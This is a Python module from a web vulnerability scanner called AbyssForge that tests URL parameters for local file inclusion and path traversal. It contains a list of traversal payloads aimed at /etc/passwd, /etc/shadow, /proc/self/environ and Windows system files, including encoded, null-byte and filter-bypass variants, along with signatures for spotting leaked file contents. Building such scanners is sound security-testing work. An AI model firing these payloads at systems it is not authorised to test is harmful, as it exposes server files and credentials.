"""
AbyssForge LFI/Path Traversal Detection Module
"""

import re
from typing import Any, Dict, List, Optional

from abyssforge.core.request import RequestHandler
from abyssforge.modules.base import BaseModule, Finding
from abyssforge.utils.helpers import get_url_params, inject_param
from abyssforge.utils.logger import get_logger

logger = get_logger("abyssforge.module.lfi")


class LFIDetector(BaseModule):
    """Local File Inclusion and Path Traversal Detection."""

    MODULE_NAME = "lfi"
    VULN_TYPE = "Local File Inclusion / Path Traversal"
    SEVERITY = "high"
    CWE = "CWE-22"
    DESCRIPTION = (
        "Path traversal vulnerabilities allow attackers to read arbitrary files "
        "from the server filesystem, potentially exposing sensitive configuration or credentials."
    )
    REMEDIATION = (
        "Validate and sanitize all file path inputs. "
        "Use allowlists for permitted files. "
        "Avoid passing user-controlled data to filesystem functions."
    )

    # File content signatures to detect successful LFI
    UNIX_SIGNATURES = [
        (r"root:.*:0:0:", "/etc/passwd"),
        (r"\[extensions\]", "win.ini"),
        (r"for 16-bit app support", "win.ini"),
        (r"\[boot loader\]", "boot.ini"),
        (r"processor.*MHz", "/proc/cpuinfo"),
    ]

    LFI_PAYLOADS = [
        # Unix
        "../etc/passwd",
        "../../etc/passwd",
        "../../../etc/passwd",
        "../../../../etc/passwd",
        "../../../../../etc/passwd",
        "/etc/passwd",
        "/etc/shadow",
        "/proc/self/environ",
        "/proc/version",
        # Windows
        "..\\Windows\\win.ini",
        "..\\..\\Windows\\win.ini",
        "C:\\Windows\\win.ini",
        "C:\\boot.ini",
        # URL encoded
        "..%2Fetc%2Fpasswd",
        "..%2F..%2Fetc%2Fpasswd",
        "%2e%2e%2fetc%2fpasswd",
        # Double encoded
        "..%252Fetc%252Fpasswd",
        # Null byte
        "../etc/passwd%00",
        "../../../etc/passwd\x00",
        # Filter bypass
        "....//....//etc/passwd",
        "..///////..////..//////etc/passwd",
    ]

    def scan(self, url: str, **kwargs: Any) -> List[Finding]:
        """Scan for LFI/path traversal vulnerabilities."""
        self.findings = []
        params = get_url_params(url)

        if not params:
            return self.findings

        # Focus on params likely to contain file paths
        file_params = [
            p for p in params
            if any(kw in p.lower() for kw in
                   ["file", "path", "page", "include", "view", "template", "doc", "read",
                    "load", "dir", "folder", "img", "image", "src"])
        ]

        # Test likely params first, then all params
        test_params = list(set(file_params + list(params.keys())))

        for param in test_params:
            self._test_lfi(url, param)

        return self.findings

    def _test_lfi(self, url: str, param: str) -> None:
        """Test a parameter for LFI."""
        for payload in self.LFI_PAYLOADS:
            try:
                test_url = inject_param(url, param, payload)
                response = self.request_handler.get(test_url)

                for signature, filename in self.UNIX_SIGNATURES:
                    if re.search(signature, response.text):
                        self.add_finding(
                            url=url,
                            parameter=param,
                            payload=payload,
                            evidence=f"File '{filename}' content detected in response",
                            severity="high",
                            confidence="high",
                            extra_info={"matched_file": filename, "payload": payload},
                        )
                        return

            except Exception as e:
                logger.debug(f"Error testing LFI: {e}")
